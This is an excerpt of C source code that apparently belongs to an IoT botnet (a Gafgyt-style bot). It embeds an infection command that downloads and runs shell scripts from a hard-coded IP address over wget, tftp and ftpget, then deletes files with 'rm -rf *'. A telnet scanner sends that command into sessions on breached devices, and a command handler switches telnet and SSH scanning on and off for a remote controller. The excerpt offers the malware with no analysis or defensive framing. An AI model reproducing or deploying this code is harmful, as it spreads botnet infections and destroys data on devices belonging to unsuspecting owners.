...
char *infectline = "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://208.67.1.167/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 208.67.1.167 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.167; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.167 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
...
void TelnetScanner()
{
        ...
        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        ...
                        case 8:
                                {
                                    if(send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://208.67.1.167/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 208.67.1.167 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.167; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.167 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                    fds[i].state = 9;
                                }
                                break;
                        ...
                        case 9:
                                {
                                    ...
                                    if(readUntil(fds[i].fd, "ulti-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                    {
										fds[i].totalTimeout = 0;
										fds[i].bufUsed = 0;
										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://208.67.1.167/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 208.67.1.167 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.167; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.167 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
...
void processCmd(int argc, unsigned char *argv[])
{
	int x;
        ...
        if(!strcmp(argv[0], "TELNET_SCAN"))
        {
                if(argc != 2)
                {
                        sockprintf(mainCommSock, "TELNET_SCAN ON | OFF\n");
                        return;
                }
		...
		if(!strcmp(argv[0], "SSH_SCAN"))
		{
				if(argc !=2)
				{
					sockprintf(mainCommSock, "SSH_SCAN ON | OFF\n");
					return;
				}
                ...
                {
                        if(scanPid == 0) return;
						sockprintf(mainCommSock, "SSH SCANNER STOPPED\n");
                        kill(scanPid, 9);
                        scanPid = 0;
                }
